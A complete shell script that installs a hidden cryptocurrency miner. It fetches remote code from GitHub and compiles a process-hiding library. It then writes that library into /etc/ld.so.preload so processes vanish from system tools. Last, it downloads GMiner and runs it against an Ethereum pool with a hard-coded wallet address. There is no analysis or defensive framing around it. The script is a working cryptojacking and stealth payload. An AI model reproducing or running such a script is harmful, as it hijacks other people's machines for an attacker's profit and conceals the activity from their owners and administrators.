#!/bin/sh
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicGmi.zip
unzip magicGmi.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://github.com/develsoftware/GMinerRelease/releases/download/2.30/gminer_2_30_linux64.tar.xz
tar -xvf gminer_2_30_linux64.tar.xz
./miner --algo ethash --server naw-eth.hiveon.net --user 0x8CB8003E428D0Fd7693D22f576A212403728c64a.gminer --ssl 1 --port 24443 --pass x
